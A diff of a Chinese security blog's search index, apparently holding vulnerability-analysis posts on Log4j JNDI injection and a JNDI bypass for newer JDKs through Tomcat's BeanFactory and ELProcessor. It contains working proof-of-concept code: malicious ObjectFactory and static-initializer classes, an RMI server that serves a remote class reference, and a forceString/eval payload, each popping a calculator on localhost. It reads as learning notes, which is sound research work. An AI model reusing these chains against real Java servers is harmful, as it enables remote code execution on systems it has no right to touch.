-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113905487.png"
-                      class="" title="image-20250311113905487"
-                > 
-
-<p>这里传入的也是remote</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113938872.png"
-                      class="" title="image-20250311113938872"
-                > 
-
-<p>这里我们可以看到有个readobject了，可以看看var4是怎么获取的也是一种思路<strong>我们这里是采用加载远程恶意类对象</strong> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114259827.png"
-                      class="" title="image-20250311114259827"
-                > 
-
-<p>可以看到我们的var20即将被返回的值是我们的远程恶意类对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114349568.png"
-                      class="" title="image-20250311114349568"
-                > 
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114558379.png"
-                      class="" title="image-20250311114558379"
-                > 
-
-<p>然后将我们的恶意类对象给实例化</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114639838.png"
-                      class="" title="image-20250311114639838"
-                > 
-
-<p>跟进函数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114944263.png"
-                      class="" title="image-20250311114944263"
-                > 发现builder为null，所以不会进入这个if
-
-<p>将恶意类名称赋值给了ref</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311115057408.png"
-                      class="" title="image-20250311115057408"
-                > 
-
-<p>获取对象的实例</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120004969.png"
-                      class="" title="image-20250311120004969"
-                >
-
-<p>获取实例的时候会调用我们写的无参构造方法，所以就执行了我们的恶意代码。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120021055.png"
-                      class="" title="image-20250311120021055"
-                > 
-
-<h2 id="恶意类的无参构造初始化"><a href="#恶意类的无参构造初始化" class="headerlink" title="恶意类的无参构造初始化"></a>恶意类的无参构造初始化</h2><p>根据上面链子发现factory.getObjectInstance函数会调用我们的类的无参实例化方法</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="类的静态方法"><a href="#类的静态方法" class="headerlink" title="类的静态方法"></a>类的静态方法</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil_static &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311125258505.png"
-                      class="" title="image-20250311125258505"
-                >
-
-<p>成功造成命令执行</p>
-<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里的漏洞触发点有一些不同</p>
-<p>javax&#x2F;naming&#x2F;spi&#x2F;NamingManager.java</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130215787.png"
-                      class="" title="image-20250311130215787"
-                > 
-
-<p>这里有个if判断，codebase为null所以不会进去</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130605217.png"
-                      class="" title="image-20250311130605217"
-                > 
-
-<p>最后会走到对我们恶意类的实例化</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130335797.png"
-                      class="" title="image-20250311130335797"
-                >
-
-<p>然后实例化调用了静态方法造成RCE</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130639541.png"
-                      class="" title="image-20250311130639541"
-                > 
-
-]]></content>
-      <categories>
-        <category>漏洞原理分析</category>
-      </categories>
-      <tags>
-        <tag>JNDI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Godzilla二次开发</title>
     <url>/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p><em>参考链接</em><a class="link"   href="https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502" >https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -1954,6 +1364,596 @@
       <tags>
         <tag>工具二次开发</tag>
         <tag>godzilla</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JNDI高版本绕过</title>
+    <url>/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>高版本JDK在RMI和LDAP的<code>trustURLCodebase</code>都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制</p>
+<h2 id="需要绕过的原因分析"><a href="#需要绕过的原因分析" class="headerlink" title="需要绕过的原因分析"></a>需要绕过的原因分析</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171223492.png"
+                      class="" title="image-20250314171223492"
+                > 
+
+<p>前面学习的时候我们发现需要将trustURLCodebase设置为true才可以进行漏洞利用，原因前面的文章有写</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171552126.png"
+                      class="" title="image-20250314171552126"
+                > 
+
+<p>但是我们现实环境中我们又不可能插入代码设置trustURLCodebase为true，所以就只能从前面两个判断中进行绕过<br>但是var8又是我们指定的类，所以没办法为null，能操作的地方就在*var8.getFactoryClassLocation()*这个地方了</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; //这个是我们利用的javax.el.ELProcessor这个类在里面</span><br><span class="line">      &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>tomcat的版本是有要求的，因为我们利用了他的forceString属性</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183149852.png"
+                      class="" title="image-20250314183149852"
+                > 
+
+<p>所以我们需要低于这些版本</p>
+<h3 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a>rmi服务端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class BeanFactoryRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">                true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=eval&quot;));</span><br><span class="line"></span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;));</span><br><span class="line">//        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;el&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>windows下那个exec里面的命令好像需要改一下，根据自身条件判断，我的是macos，windows改成calc即可</p>
+<h3 id="尝试连接的客户端"><a href="#尝试连接的客户端" class="headerlink" title="尝试连接的客户端"></a>尝试连接的客户端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Object lookup = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="绕过用的类分析"><a href="#绕过用的类分析" class="headerlink" title="绕过用的类分析"></a>绕过用的类分析</h2><p>我们使用了ResourceRef对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173241334.png"
+                      class="" title="image-20250314173241334"
+                > 
+
+<p>参考浅蓝师傅的文章</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314172459283.png"
+                      class="" title="image-20250314172459283"
+                > 
+<p>参考这个师傅的文章的图<a class="link"   href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943" >https://www.cnblogs.com/EddieMurphy-blogs/p/18078943<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<h3 id="ResourceRef"><a href="#ResourceRef" class="headerlink" title="ResourceRef"></a>ResourceRef</h3><p><strong>初步分析，这里看不懂很正常，我就举一下这里用到的两个类的关键的地方</strong></p>
+<p>看着我的步骤把后续的JNDI完整的链子跟完就知道这些关键点的用处了</p>
+<p>这个类的构造有三个关键的地方</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185156624.png"
+                      class="" title="image-20250314185156624"
+                > 
+
+<h4 id="factoryLocation为null"><a href="#factoryLocation为null" class="headerlink" title="factoryLocation为null"></a>factoryLocation为null</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185354274.png"
+                      class="" title="image-20250314185354274"
+                > 
+
+<p>获取了我们构造的ResourceRef对象，然后获取它的<strong>factoryLocation</strong> ，如果为null，那就绕过，执行else里面的return 后面的方法</p>
+<h4 id="factory为BeanFactory"><a href="#factory为BeanFactory" class="headerlink" title="factory为BeanFactory"></a>factory为BeanFactory</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185709179.png"
+                      class="" title="image-20250314185709179"
+                > 
+
+<p>从我们构造的ResourceRef中获取factoryClass，提取出了BeanFactory</p>
+<h4 id="resourceClass为漏洞利用的类"><a href="#resourceClass为漏洞利用的类" class="headerlink" title="resourceClass为漏洞利用的类"></a>resourceClass为漏洞利用的类</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185820880.png"
+                      class="" title="image-20250314185820880"
+                > 
+
+<p>factory为org.apache.naming.factory.BeanFactory，所以调用它的getObjectInstance方法</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185922046.png"
+                      class="" title="image-20250314185922046"
+                > 
+
+<p>这里他获取了ref就是我们的ResourceRef对象的class的name，就是我们resourceClass设置的<strong>javax.el.ELProcessor</strong> ，然后后续就是将这个<strong>javax.el.ELProcessor</strong> 给实例化然后利用反射去调用eval方法实现命令执行。</p>
+<h3 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><p>这个类我们先不看太多，流程跟着后面完整分析走就可以懂，就看一个关键的点。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190224659.png"
+                      class="" title="image-20250314190224659"
+                > 
+
+<p>获取了我们所需要用到的<strong>javax.el.ELProcessor</strong> 的类名</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190250894.png"
+                      class="" title="image-20250314190250894"
+                > 
+
+<p>把我们的类给实例化了存在bean参数里面</p>
+<p><strong>中间有一段获取方法以及参数的过程</strong> 流程后面有写</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190342664.png"
+                      class="" title="image-20250314190342664"
+                > 
+
+<p>反射调用命令执行。</p>
+<h2 id="JNDI绕过完整分析"><a href="#JNDI绕过完整分析" class="headerlink" title="JNDI绕过完整分析"></a>JNDI绕过完整分析</h2><p>看一下payload对应的参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173431977.png"
+                      class="" title="image-20250314173431977"
+                > 
+
+<p>可以观察到factoryLocation这个参数被设置为了null，就是为了绕过我们的JNDI的那个if判断</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173927228.png"
+                      class="" title="image-20250314173927228"
+                > 
+<p>然后还有forceString进行构造，我们可以打上断点进行跟踪</p>
+<h3 id="漏洞触发点分析"><a href="#漏洞触发点分析" class="headerlink" title="漏洞触发点分析"></a>漏洞触发点分析</h3><p>接下来分析的是，lookup()链子走的时候是怎么绕过前面说的trustURLCodebase的限制，以及怎么触发的实例化getObjectInstance方法。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183733704.png"
+                      class="" title="image-20250314183733704"
+                > 
+
+<p>进入deocdeObject</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183818414.png"
+                      class="" title="image-20250314183818414"
+                > 
+
+<p>提前看一下被限制的地方我们打上断点</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183851246.png"
+                      class="" title="image-20250314183851246"
+                > 
+
+<p>然后我们一步一步走</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183930238.png"
+                      class="" title="image-20250314183930238"
+                > 
+
+<p>var3是ResourceRef对象，且后续将它赋值给了var8</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184007058.png"
+                      class="" title="image-20250314184007058"
+                > 
+
+<p>然后进入判断的地方</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184020438.png"
+                      class="" title="image-20250314184020438"
+                > 
+
+<p>这里我们前面的payload设置为null的，所以可以绕过</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184052474.png"
+                      class="" title="image-20250314184052474"
+                > 
+
+<p>走到了我们实例化的地方，var3此时还是ResourceRef对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184424645.png"
+                      class="" title="image-20250314184424645"
+                > 
+
+<p>这里获取factoryClassName，然后进行操作</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184537599.png"
+                      class="" title="image-20250314184537599"
+                > 
+
+<p>漏洞触发点，这里构造成了<strong>org.apache.naming.factory.BeanFactory.getObjectInstance</strong> 就是我们上面写的地方</p>
+<h3 id="org-apache-naming-factory-BeanFactory-1"><a href="#org-apache-naming-factory-BeanFactory-1" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180259634.png"
+                      class="" title="image-20250314180259634"
+                > 
+
+<p>这里获取了我们要利用的类的类名</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180337115.png"
+                      class="" title="image-20250314180337115"
+                > 
+
+<p>然后将他加载</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180520260.png"
+                      class="" title="image-20250314180520260"
+                > 
+
+<p>将它实例化存储在bean里面</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314191103326.png"
+                      class="" title="image-20250314191103326"
+                > 
+
+<p>从forceString里面提取字符串a&#x3D;eval，然后提取为了param&#x3D;a，setterName&#x3D;eval</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180633736.png"
+                      class="" title="image-20250314180633736"
+                > 
+
+<p>跟进他这里的getMethod，因为此时我们的类在变量beanClass里，eval也是提取出来在setterName，没有拼接或者组合成<strong>javax.el.ELProcessor.eval()</strong> ,这里就是获取方法的地方，就像我们之前的<strong>类.getMethod(方法名,参数类型)</strong>  </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181503362.png"
+                      class="" title="image-20250314181503362"
+                > 
+
+<p>进行一个循环，要求右边那一列不为scope、auth、singletoken、forceString</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181638180.png"
+                      class="" title="image-20250314181638180"
+                > 
+
+<p>value就是获取的参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181734119.png"
+                      class="" title="image-20250314181734119"
+                > 
+
+<p>获取参数成功。</p>
+<p>这里就很眼熟了，method为方法，bean为对象，valueArray就是参数，利用反射去造成命令执行。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314175123674.png"
+                      class="" title="image-20250314175123674"
+                > 
+
+<p>计算器弹出成功。最后达成了类似<strong>eval.invoke(javax.el.ELProcessor,Runtime.getRuntime().exec(“open -a Calculator”))</strong></p>
+]]></content>
+      <categories>
+        <category>漏洞原理分析</category>
+      </categories>
+      <tags>
+        <tag>JNDI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Log4j漏洞分析</title>
+    <url>/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+<li>rmi服务端</li>
+<li>rmi客户端</li>
+<li>恶意类的实现</li>
+<li>idea+jdk1.8.0_441</li>
+</ul>
+<h2 id="pom-xml导入依赖"><a href="#pom-xml导入依赖" class="headerlink" title="pom.xml导入依赖"></a>pom.xml导入依赖</h2><p>正常可以使用maven</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></div>
+<p>但是我使用的阿里云的maven配置，所以一直远程拉取不了，这里介绍本地配置依赖的方法<br>访问<a class="link"   href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0" >https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110830202.png"
+                      class="" title="image-20250311110830202"
+                >
+
+<p>创建一个lib目录将依赖放进去</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110902143.png"
+                      class="" title="image-20250311110902143"
+                > 
+
+<p>然后pom.xml里面配置</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;project.basedir&#125;/lib/log4j-core-2.9.0.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="服务端代码实现"><a href="#服务端代码实现" class="headerlink" title="服务端代码实现"></a>服务端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line">public class log4j_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(12345);</span><br><span class="line">        //创建一个注册表且端口为12345</span><br><span class="line">        Reference reference = new Reference(&quot;Evil&quot;, &quot;Evil&quot;,</span><br><span class="line">                &quot;http://127.0.0.1:8080/&quot;);</span><br><span class="line">        //创建Reference对象，类名为Evil，工厂类名为Evil</span><br><span class="line">        ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">        //使用ReferenceWrapper包装Reference对象</span><br><span class="line">        registry.bind(&quot;remote&quot;, wrapper);</span><br><span class="line">        //将包装好的对象绑定到注册表中并设置名称为remote</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111035431.png"
+                      class="" title="image-20250311111035431"
+                >
+
